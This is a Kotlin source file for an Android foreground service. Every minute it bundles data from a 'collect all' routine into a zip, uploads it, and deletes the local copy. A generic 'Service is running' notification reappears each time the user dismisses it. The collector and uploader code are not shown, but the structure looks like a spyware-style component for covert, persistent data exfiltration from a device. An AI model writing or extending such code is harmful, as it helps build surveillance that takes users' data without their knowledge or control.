package com.example.foregroundservice

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import android.os.Handler
import android.os.Looper

class ForegroundService : Service() {

    private val CHANNEL_ID = "ForegroundServiceChannel"
    private val COLLECT_INTERVAL_MS = 60_000L // 1 min
    private val handler = Handler(Looper.getMainLooper())
    private val NOTIFICATION_ID = 1
    private val DISMISSED_ACTION = "com.example.foregroundservice.DISMISSED_ACTION"

    private val collectTask = object : Runnable {
        override fun run() {
            Thread { collectAndUpload() }.start()
            handler.postDelayed(this, COLLECT_INTERVAL_MS)
        }
    }

    private val onNotificationDismissedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            showNotification()
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        val filter = IntentFilter(DISMISSED_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                onNotificationDismissedReceiver,
                filter,
                Context.RECEIVER_NOT_EXPORTED
            )
        } else {
            registerReceiver(onNotificationDismissedReceiver, filter)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        showNotification()
        handler.post(collectTask)
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(collectTask)
        unregisterReceiver(onNotificationDismissedReceiver)
        stopForeground(STOP_FOREGROUND_REMOVE)
        super.onDestroy()
    }

    private fun showNotification() {
        val dismissedIntent = Intent(DISMISSED_ACTION).apply {
            setPackage(packageName)
        }
        val dismissedPendingIntent = PendingIntent.getBroadcast(
            this,
            0,
            dismissedIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service is running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setDeleteIntent(dismissedPendingIntent)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Foreground Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun collectAndUpload() {
        try {
            val zipFile = DataCollector.collectAllAsZip(applicationContext)
            android.util.Log.d("DataCollector", "zip created: ${zipFile.name}, ${zipFile.length()} bytes")
            val ok = Uploader.uploadZip(zipFile)
            android.util.Log.d("Uploader", "upload result: $ok")
            zipFile.delete()
        } catch (e: Exception) {
            android.util.Log.e("DataCollector", "collect failed", e)
        }
    }
}
